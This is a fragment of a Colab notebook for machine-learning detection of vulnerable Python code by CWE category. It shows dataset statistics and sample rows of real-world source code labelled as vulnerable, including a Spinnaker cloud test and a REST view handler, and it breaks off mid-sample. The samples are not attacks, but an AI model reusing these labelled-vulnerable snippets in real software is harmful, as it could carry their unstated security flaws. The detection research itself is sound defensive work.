        "id": "fLMaTQT9RiG9",
        "outputId": "3fce959d-b129-4f03-a9f5-18947a347512"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 227ms/step\n",
            "Actual CWE: CWE-89 (Keyword: sql)\n",
            "Predicted CWE: CWE-89\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 여러 모델"
      ],
      "metadata": {
        "id": "9niujZ2qSyEz"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Get the total number of rows in the DataFrame\n",
        "num_rows = df.shape[0]\n",
        "print(f\"Total number of rows in df: {num_rows}\")\n",
        "\n",
        "# Get the count of each unique CWE label\n",
        "cwe_counts = df['CWE'].value_counts()\n",
        "print(\"\\nCounts of each CWE label:\")\n",
        "display(cwe_counts)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 390
        },
        "id": "zK0jwxT3Ts2N",
        "outputId": "b6ba4f10-fefe-46a3-a32c-5be9972a82d9"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Total number of rows in df: 3896\n",
            "\n",
            "Counts of each CWE label:\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "CWE\n",
              "CWE-89     1394\n",
              "CWE-352     762\n",
              "CWE-538     475\n",
              "CWE-77      400\n",
              "CWE-601     346\n",
              "CWE-94      296\n",
              "CWE-79      223\n",
              "Name: count, dtype: int64"
            ],
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>count</th>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>CWE</th>\n",
              "      <th></th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>CWE-89</th>\n",
              "      <td>1394</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>CWE-352</th>\n",
              "      <td>762</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>CWE-538</th>\n",
              "      <td>475</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>CWE-77</th>\n",
              "      <td>400</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>CWE-601</th>\n",
              "      <td>346</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>CWE-94</th>\n",
              "      <td>296</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>CWE-79</th>\n",
              "      <td>223</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div><br><label><b>dtype:</b> int64</label>"
            ]
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 정상, 취약 데이터셋 통합"
      ],
      "metadata": {
        "id": "mtUAstWJQqAG"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install gensim"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "rPA9uMacRXUU",
        "outputId": "37e52834-ed26-4462-e129-05deb7a1141d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: gensim in /usr/local/lib/python3.12/dist-packages (4.3.3)\n",
            "Requirement already satisfied: numpy<2.0,>=1.18.5 in /usr/local/lib/python3.12/dist-packages (from gensim) (1.26.4)\n",
            "Requirement already satisfied: scipy<1.14.0,>=1.7.0 in /usr/local/lib/python3.12/dist-packages (from gensim) (1.13.1)\n",
            "Requirement already satisfied: smart-open>=1.8.1 in /usr/local/lib/python3.12/dist-packages (from gensim) (7.3.0.post1)\n",
            "Requirement already satisfied: wrapt in /usr/local/lib/python3.12/dist-packages (from smart-open>=1.8.1->gensim) (1.17.3)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# 1. 구글 드라이브 마운트\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive')\n",
        "\n",
        "# 2. 작업 폴더 생성 및 이동 (VUDENC 프로젝트를 저장할 위치)\n",
        "# 경로에 본인의 구글 드라이브 ID나 원하는 폴더명을 넣으셔도 됩니다.\n",
        "import os\n",
        "workspace_path = '/content/drive/MyDrive/fortmp/'\n",
        "os.makedirs(workspace_path, exist_ok=True)\n",
        "%cd {workspace_path}\n",
        "\n",
        "print(f\"현재 작업 위치: {os.getcwd()}\")\n",
        "\n",
        "import pandas as pd\n",
        "import numpy as np\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qBgAQzhxRPjg",
        "outputId": "95d94705-aa94-4755-88d9-e88ceb5865d0"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Drive already mounted at /content/drive; to attempt to forcibly remount, call drive.mount(\"/content/drive\", force_remount=True).\n",
            "/content/drive/MyDrive/fortmp\n",
            "현재 작업 위치: /content/drive/MyDrive/fortmp\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "file_path = 'combined_dataset.csv'\n",
        "df_final = pd.read_csv(file_path)\n",
        "display(df_final.head())"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 206
        },
        "id": "Tvet1oy7QtTj",
        "outputId": "47ddf23f-0cf2-4496-94d9-18986e7a6427"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "                                         source_code  label\n",
              "0  \\n\\nfrom __future__ import annotations\\n\\nimpo...      0\n",
              "1  \\n\\nimport time import sys import citest.gcp_t...      1\n",
              "2  \\n import json from django.http import JsonRes...      1\n",
              "3  \\n import json from django.http import JsonRes...      1\n",
              "4  \\nimport json import os import time import Que...      1"
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-0f327afb-3bcb-41f1-8ee0-98c1d8056416\" class=\"colab-df-container\">\n",
              "    <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>source_code</th>\n",
              "      <th>label</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>\\n\\nfrom __future__ import annotations\\n\\nimpo...</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>\\n\\nimport time import sys import citest.gcp_t...</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>\\n import json from django.http import JsonRes...</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>\\n import json from django.http import JsonRes...</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>\\nimport json import os import time import Que...</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "    <div class=\"colab-df-buttons\">\n",
              "\n",
              "  <div class=\"colab-df-container\">\n",
              "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-0f327afb-3bcb-41f1-8ee0-98c1d8056416')\"\n",
              "            title=\"Convert this dataframe to an interactive table.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
              "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "\n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    .colab-df-buttons div {\n",
              "      margin-bottom: 4px;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "    <script>\n",
              "      const buttonEl =\n",
              "        document.querySelector('#df-0f327afb-3bcb-41f1-8ee0-98c1d8056416 button.colab-df-convert');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      async function convertToInteractive(key) {\n",
              "        const element = document.querySelector('#df-0f327afb-3bcb-41f1-8ee0-98c1d8056416');\n",
              "        const dataTable =\n",
              "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                    [key], {});\n",
              "        if (!dataTable) return;\n",
              "\n",
              "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "          + ' to learn more about interactive tables.';\n",
              "        element.innerHTML = '';\n",
              "        dataTable['output_type'] = 'display_data';\n",
              "        await google.colab.output.renderOutput(dataTable, element);\n",
              "        const docLink = document.createElement('div');\n",
              "        docLink.innerHTML = docLinkHtml;\n",
              "        element.appendChild(docLink);\n",
              "      }\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "\n",
              "    <div id=\"df-76a02a30-4bc5-43df-b4ba-6a868f8e888b\">\n",
              "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-76a02a30-4bc5-43df-b4ba-6a868f8e888b')\"\n",
              "                title=\"Suggest charts\"\n",
              "                style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "      </button>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "      --bg-color: #E8F0FE;\n",
              "      --fill-color: #1967D2;\n",
              "      --hover-bg-color: #E2EBFA;\n",
              "      --hover-fill-color: #174EA6;\n",
              "      --disabled-fill-color: #AAA;\n",
              "      --disabled-bg-color: #DDD;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "      --bg-color: #3B4455;\n",
              "      --fill-color: #D2E3FC;\n",
              "      --hover-bg-color: #434B5C;\n",
              "      --hover-fill-color: #FFFFFF;\n",
              "      --disabled-bg-color: #3B4455;\n",
              "      --disabled-fill-color: #666;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart {\n",
              "    background-color: var(--bg-color);\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: var(--fill-color);\n",
              "    height: 32px;\n",
              "    padding: 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: var(--hover-bg-color);\n",
              "    box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: var(--button-hover-fill-color);\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart-complete:disabled,\n",
              "  .colab-df-quickchart-complete:disabled:hover {\n",
              "    background-color: var(--disabled-bg-color);\n",
              "    fill: var(--disabled-fill-color);\n",
              "    box-shadow: none;\n",
              "  }\n",
              "\n",
              "  .colab-df-spinner {\n",
              "    border: 2px solid var(--fill-color);\n",
              "    border-color: transparent;\n",
              "    border-bottom-color: var(--fill-color);\n",
              "    animation:\n",
              "      spin 1s steps(1) infinite;\n",
              "  }\n",
              "\n",
              "  @keyframes spin {\n",
              "    0% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "      border-left-color: var(--fill-color);\n",
              "    }\n",
              "    20% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    30% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    40% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    60% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    80% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "    90% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "  }\n",
              "</style>\n",
              "\n",
              "      <script>\n",
              "        async function quickchart(key) {\n",
              "          const quickchartButtonEl =\n",
              "            document.querySelector('#' + key + ' button');\n",
              "          quickchartButtonEl.disabled = true;  // To prevent multiple clicks.\n",
              "          quickchartButtonEl.classList.add('colab-df-spinner');\n",
              "          try {\n",
              "            const charts = await google.colab.kernel.invokeFunction(\n",
              "                'suggestCharts', [key], {});\n",
              "          } catch (error) {\n",
              "            console.error('Error during call to suggestCharts:', error);\n",
              "          }\n",
              "          quickchartButtonEl.classList.remove('colab-df-spinner');\n",
              "          quickchartButtonEl.classList.add('colab-df-quickchart-complete');\n",
              "        }\n",
              "        (() => {\n",
              "          let quickchartButtonEl =\n",
              "            document.querySelector('#df-76a02a30-4bc5-43df-b4ba-6a868f8e888b button');\n",
              "          quickchartButtonEl.style.display =\n",
              "            google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "        })();\n",
              "      </script>\n",
              "    </div>\n",
              "\n",
              "    </div>\n",
              "  </div>\n"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "dataframe",
              "summary": "{\n  \"name\": \"display(df_final\",\n  \"rows\": 5,\n  \"fields\": [\n    {\n      \"column\": \"source_code\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 4,\n        \"samples\": [\n          \"\\n\\nimport time import sys import citest.gcp_testing as gcp import citest.json_contract as jc import citest.service_testing as st import spinnaker_testing as sk import spinnaker_testing.gate as gate class GoogleServerGroupTestScenario(sk.SpinnakerTestScenario): @classmethod def new_agent(cls, bindings): '''Implements the base class interface to create a new agent. This method is called by the base classes during setup/initialization. Args: bindings: The bindings dictionary with configuration information that this factory can draw from to initialize. If the factory would like additional custom bindings it could add them to initArgumentParser. Returns: A citest.service_testing.BaseAgent that can interact with Gate. This is the agent that test operations will be posted to. ''' return gate.new_agent(bindings) def __init__(self, bindings, agent=None): super(GoogleServerGroupTestScenario, self).__init__(bindings, agent) self.TEST_APP=bindings['TEST_APP'] self.__path='applications/%s/tasks' % self.TEST_APP self.TEST_STACK=bindings['TEST_STACK'] self.TEST_REGION=bindings['TEST_GCE_REGION'] self.TEST_ZONE=bindings['TEST_GCE_ZONE'] self.__cluster_name='%s-%s' %(self.TEST_APP, self.TEST_STACK) self.__server_group_name='%s-v000' % self.__cluster_name self.__cloned_server_group_name='%s-v001' % self.__cluster_name self.__lb_name='%s-%s-fe' %(self.TEST_APP, self.TEST_STACK) def create_load_balancer(self): job=[{ 'cloudProvider': 'gce', 'loadBalancerName': self.__lb_name, 'ipProtocol': 'TCP', 'portRange': '8080', 'provider': 'gce', 'stack': self.TEST_STACK, 'detail': 'frontend', 'credentials': self.bindings['GCE_CREDENTIALS'], 'region': self.TEST_REGION, 'listeners':[{ 'protocol': 'TCP', 'portRange': '8080', 'healthCheck': False }], 'name': self.__lb_name, 'type': 'upsertLoadBalancer', 'availabilityZones':{self.TEST_REGION:[]}, 'user': 'integration-tests' }] builder=gcp.GceContractBuilder(self.gce_observer) (builder.new_clause_builder('Load Balancer Created', retryable_for_secs=30) .list_resources('forwarding-rules') .contains_path_value('name', self.__lb_name)) payload=self.agent.make_json_payload_from_kwargs( job=job, description='Server Group Test -create load balancer', application=self.TEST_APP) return st.OperationContract( self.new_post_operation( title='create_load_balancer', data=payload, path=self.__path), contract=builder.build()) def create_instances(self): job=[{ 'application': self.TEST_APP, 'stack': self.TEST_STACK, 'credentials': self.bindings['GCE_CREDENTIALS'], 'zone': self.TEST_ZONE, 'network': 'default', 'targetSize': 1, 'capacity':{ 'min': 1, 'max': 1, 'desired': 1 }, 'availabilityZones':{ self.TEST_REGION:[self.TEST_ZONE] }, 'loadBalancers':[self.__lb_name], 'instanceMetadata':{ 'load-balancer-names': self.__lb_name }, 'cloudProvider': 'gce', 'image': self.bindings['TEST_GCE_IMAGE_NAME'], 'instanceType': 'f1-micro', 'initialNumReplicas': 1, 'type': 'createServerGroup', 'account': self.bindings['GCE_CREDENTIALS'], 'user': 'integration-tests' }] builder=gcp.GceContractBuilder(self.gce_observer) (builder.new_clause_builder('Instance Created', retryable_for_secs=150) .list_resources('instance-groups') .contains_path_value('name', self.__server_group_name)) payload=self.agent.make_json_payload_from_kwargs( job=job, description='Server Group Test -create initial server group', application=self.TEST_APP) return st.OperationContract( self.new_post_operation( title='create_instances', data=payload, path=self.__path), contract=builder.build()) def resize_server_group(self): job=[{ 'targetSize': 2, 'capacity':{ 'min': 2, 'max': 2, 'desired': 2 }, 'replicaPoolName': self.__server_group_name, 'numReplicas': 2, 'region': self.TEST_REGION, 'zone': self.TEST_ZONE, 'asgName': self.__server_group_name, 'type': 'resizeServerGroup', 'regions':[self.TEST_REGION], 'zones':[self.TEST_ZONE], 'credentials': self.bindings['GCE_CREDENTIALS'], 'cloudProvider': 'gce', 'user': 'integration-tests' }] builder=gcp.GceContractBuilder(self.gce_observer) (builder.new_clause_builder('Server Group Resized', retryable_for_secs=90) .inspect_resource('instance-groups', self.__server_group_name, ['--zone', self.TEST_ZONE]) .contains_path_eq('size', 2)) payload=self.agent.make_json_payload_from_kwargs( job=job, description='Server Group Test -resize to 2 instances', application=self.TEST_APP) return st.OperationContract( self.new_post_operation( title='resize_instances', data=payload, path=self.__path), contract=builder.build()) def clone_server_group(self): job=[{ 'application': self.TEST_APP, 'stack': self.TEST_STACK, 'credentials': self.bindings['GCE_CREDENTIALS'], 'loadBalancers':[self.__lb_name], 'targetSize': 1, 'capacity':{ 'min': 1, 'max': 1, 'desired': 1 }, 'zone': self.TEST_ZONE, 'network': 'default', 'instanceMetadata':{'load-balancer-names': self.__lb_name}, 'availabilityZones':{self.TEST_REGION:[self.TEST_ZONE]}, 'cloudProvider': 'gce', 'source':{ 'account': self.bindings['GCE_CREDENTIALS'], 'region': self.TEST_REGION, 'zone': self.TEST_ZONE, 'serverGroupName': self.__server_group_name, 'asgName': self.__server_group_name }, 'instanceType': 'f1-micro', 'image': self.bindings['TEST_GCE_IMAGE_NAME'], 'initialNumReplicas': 1, 'loadBalancers':[self.__lb_name], 'type': 'cloneServerGroup', 'account': self.bindings['GCE_CREDENTIALS'], 'user': 'integration-tests' }] builder=gcp.GceContractBuilder(self.gce_observer) (builder.new_clause_builder('Server Group Cloned', retryable_for_secs=90) .list_resources('managed-instance-groups') .contains_path_value('baseInstanceName', self.__cloned_server_group_name)) payload=self.agent.make_json_payload_from_kwargs( job=job, description='Server Group Test -clone server group', application=self.TEST_APP) return st.OperationContract( self.new_post_operation( title='clone_server_group', data=payload, path=self.__path), contract=builder.build()) def disable_server_group(self): job=[{ 'cloudProvider': 'gce', 'asgName': self.__server_group_name, 'serverGroupName': self.__server_group_name, 'region': self.TEST_REGION, 'zone': self.TEST_ZONE, 'type': 'disableServerGroup', 'regions':[self.TEST_REGION], 'zones':[self.TEST_ZONE], 'credentials': self.bindings['GCE_CREDENTIALS'], 'user': 'integration-tests' }] builder=gcp.GceContractBuilder(self.gce_observer) (builder.new_clause_builder('Server Group Disabled', retryable_for_secs=90) .list_resources('managed-instance-groups') .contains_path_value('baseInstanceName', self.__server_group_name) .excludes_pred_list([ jc.PathContainsPredicate('baseInstanceName', self.__server_group_name), jc.PathContainsPredicate('targetPools', 'https')])) payload=self.agent.make_json_payload_from_kwargs( job=job, description='Server Group Test -disable server group', application=self.TEST_APP) return st.OperationContract( self.new_post_operation( title='disable_server_group', data=payload, path=self.__path), contract=builder.build()) def enable_server_group(self): job=[{ 'cloudProvider': 'gce', 'asgName': self.__server_group_name, 'serverGroupName': self.__server_group_name, 'region': self.TEST_REGION, 'zone': self.TEST_ZONE, 'type': 'enableServerGroup', 'regions':[self.TEST_REGION], 'zones':[self.TEST_ZONE], 'credentials': self.bindings['GCE_CREDENTIALS'], 'user': 'integration-tests' }] builder=gcp.GceContractBuilder(self.gce_observer) (builder.new_clause_builder('Server Group Enabled', retryable_for_secs=90) .list_resources('managed-instance-groups') .contains_pred_list([ jc.PathContainsPredicate('baseInstanceName', self.__server_group_name), jc.PathContainsPredicate('targetPools', 'https')])) payload=self.agent.make_json_payload_from_kwargs( job=job, description='Server Group Test -enable server group', application=self.TEST_APP) return st.OperationContract( self.new_post_operation( title='enable_server_group', data=payload, path=self.__path), contract=builder.build()) def destroy_server_group(self, version): serverGroupName='%s-%s' %(self.__cluster_name, version) job=[{ 'cloudProvider': 'gce', 'asgName': serverGroupName, 'serverGroupName': serverGroupName, 'region': self.TEST_REGION, 'zone': self.TEST_ZONE, 'type': 'destroyServerGroup', 'regions':[self.TEST_REGION], 'zones':[self.TEST_ZONE], 'credentials': self.bindings['GCE_CREDENTIALS'], 'user': 'integration-tests' }] builder=gcp.GceContractBuilder(self.gce_observer) (builder.new_clause_builder('Server Group Destroyed', retryable_for_secs=90) .list_resources('managed-instance-groups') .excludes_path_value('baseInstanceName', serverGroupName)) payload=self.agent.make_json_payload_from_kwargs( job=job, description='Server Group Test -destroy server group', application=self.TEST_APP) return st.OperationContract( self.new_post_operation( title='destroy_server_group', data=payload, path=self.__path), contract=builder.build()) def delete_load_balancer(self): job=[{ \\\"loadBalancerName\\\": self.__lb_name, \\\"networkLoadBalancerName\\\": self.__lb_name, \\\"region\\\": \\\"us-central1\\\", \\\"type\\\": \\\"deleteLoadBalancer\\\", \\\"regions\\\":[\\\"us-central1\\\"], \\\"credentials\\\": self.bindings['GCE_CREDENTIALS'], \\\"cloudProvider\\\": \\\"gce\\\", \\\"user\\\": \\\"integration-tests\\\" }] builder=gcp.GceContractBuilder(self.gce_observer) (builder.new_clause_builder('Load Balancer Created', retryable_for_secs=30) .list_resources('forwarding-rules') .excludes_path_value('name', self.__lb_name)) payload=self.agent.make_json_payload_from_kwargs( job=job, description='Server Group Test -delete load balancer', application=self.TEST_APP) return st.OperationContract( self.new_post_operation( title='delete_load_balancer', data=payload, path=self.__path), contract=builder.build()) class GoogleServerGroupTest(st.AgentTestCase): def test_a_create_load_balancer(self): self.run_test_case(self.scenario.create_load_balancer()) def test_b_create_server_group(self): self.run_test_case(self.scenario.create_instances()) def test_c_resize_server_group(self): self.run_test_case(self.scenario.resize_server_group()) def test_d_clone_server_group(self): self.run_test_case(self.scenario.clone_server_group(), max_retries=5) def test_e_disable_server_group(self): self.run_test_case(self.scenario.disable_server_group()) def test_f_enable_server_group(self): self.run_test_case(self.scenario.enable_server_group()) def test_g_destroy_server_group_v000(self): self.run_test_case(self.scenario.destroy_server_group('v000')) def test_h_destroy_server_group_v001(self): self.run_test_case(self.scenario.destroy_server_group('v001')) def test_z_delete_load_balancer(self): self.run_test_case(self.scenario.delete_load_balancer()) def main(): defaults={ 'TEST_STACK': GoogleServerGroupTestScenario.DEFAULT_TEST_ID, 'TEST_APP': 'gcpsvrgrptst' +GoogleServerGroupTestScenario.DEFAULT_TEST_ID } return st.ScenarioTestRunner.main( GoogleServerGroupTestScenario, default_binding_overrides=defaults, test_case_list=[GoogleServerGroupTest]) if __name__=='__main__': sys.exit(main()) \",\n          \"\\nimport json import os import time import Queue from grokcore.component import context from hashlib import sha1 from twisted.web.server import NOT_DONE_YET from twisted.python import log from twisted.internet import reactor, threads, defer from zope.component import queryAdapter, handle from zope.security.interfaces import Unauthorized from zope.security.proxy import removeSecurityProxy from opennode.oms.endpoint.httprest.base import HttpRestView, IHttpRestView from opennode.oms.endpoint.httprest.root import BadRequest, NotFound from opennode.oms.endpoint.ssh.cmd.security import effective_perms from opennode.oms.endpoint.ssh.detached import DetachedProtocol from opennode.oms.endpoint.ssh.cmdline import ArgumentParsingError from opennode.oms.model.form import RawDataApplier from opennode.oms.model.location import ILocation from opennode.oms.model.model.base import IContainer from opennode.oms.model.model.bin import ICommand from opennode.oms.model.model.byname import ByNameContainer from opennode.oms.model.model.events import ModelDeletedEvent from opennode.oms.model.model.filtrable import IFiltrable from opennode.oms.model.model.search import SearchContainer, SearchResult from opennode.oms.model.model.stream import IStream, StreamSubscriber from opennode.oms.model.model.symlink import Symlink, follow_symlinks from opennode.oms.model.schema import model_to_dict from opennode.oms.model.traversal import traverse_path from opennode.oms.security.checker import get_interaction from opennode.oms.zodb import db class DefaultView(HttpRestView): context(object) def render_GET(self, request): if not request.interaction.checkPermission('view', self.context): raise NotFound() data=model_to_dict(self.context) data['id']=self.context.__name__ data['__type__']=type(removeSecurityProxy(self.context)).__name__ try: data['url']=ILocation(self.context).get_url() except Unauthorized: data['url']='' interaction=get_interaction(self.context) data['permissions']=effective_perms(interaction, self.context) if interaction else[] if 'tags' in data: data['tags']=list(data['tags']) return data def render_PUT(self, request): data=json.load(request.content) if 'id' in data: del data['id'] data=self.put_filter_attributes(request, data) form=RawDataApplier(data, self.context) if not form.errors: form.apply() return[IHttpRestView(self.context).render_recursive(request, depth=0)] else: request.setResponseCode(BadRequest.status_code) return form.error_dict() def put_filter_attributes(self, request, data): \\\"\\\"\\\"Offer the possibility to subclasses to massage the received json before default behavior.\\\"\\\"\\\" return data def render_DELETE(self, request): force=request.args.get('force',['false'])[0]=='true' parent=self.context.__parent__ del parent[self.context.__name__] try: handle(self.context, ModelDeletedEvent(parent)) except Exception as e: if not force: raise e return{'status': 'failure'} return{'status': 'success'} class ContainerView(DefaultView): context(IContainer) def render_GET(self, request): depth=request.args.get('depth',['0'])[0] try: depth=int(depth) except ValueError: depth=0 return self.render_recursive(request, depth, top_level=True) def render_recursive(self, request, depth, filter_=[], top_level=False): container_properties=super(ContainerView, self).render_GET(request) if depth < 1: return self.filter_attributes(request, container_properties) exclude=[excluded.strip() for excluded in request.args.get('exclude',[''])[0].split(',')] def preconditions(obj): yield request.interaction.checkPermission('view', obj) yield obj.__name__ not in exclude yield obj.target.__parent__==obj.__parent__ if type(obj) is Symlink else True items=map(follow_symlinks, filter(lambda obj: all(preconditions(obj)), self.context.listcontent())) def secure_render_recursive(item): try: return IHttpRestView(item).render_recursive(request, depth -1) except Unauthorized: permissions=effective_perms(get_interaction(item), item) if 'view' in permissions: return dict(access='denied', permissions=permissions, __type__=type(removeSecurityProxy(item)).__name__) qlist=[] limit=None offset=0 if top_level: qlist=request.args.get('q',[]) qlist=map(lambda q: q.decode('utf-8'), qlist) limit=int(request.args.get('limit',[0])[0]) offset=int(request.args.get('offset',[1])[0]) -1 if offset <=0: offset=0 def secure_filter_match(item, q): try: return IFiltrable(item).match(q) except Unauthorized: return for q in qlist: items=filter(lambda item: secure_filter_match(item, q), items) children=filter(None,[secure_render_recursive(item) for item in items if queryAdapter(item, IHttpRestView) and not self.blacklisted(item)]) total_children=len(children) if(limit is not None and limit !=0) or offset: children=children[offset: offset +limit] if top_level and(not container_properties or len(container_properties.keys())==1): return children if not top_level or depth > 0: container_properties['children']=children container_properties['totalChildren']=total_children return self.filter_attributes(request, container_properties) def blacklisted(self, item): return isinstance(item, ByNameContainer) class SearchView(ContainerView): context(SearchContainer) def render_GET(self, request): q=request.args.get('q',[''])[0] if not q: return super(SearchView, self).render_GET(request) 